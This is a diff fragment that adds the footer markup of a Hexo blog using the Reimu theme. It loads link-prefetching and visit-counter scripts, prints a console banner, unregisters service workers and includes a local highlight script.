+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
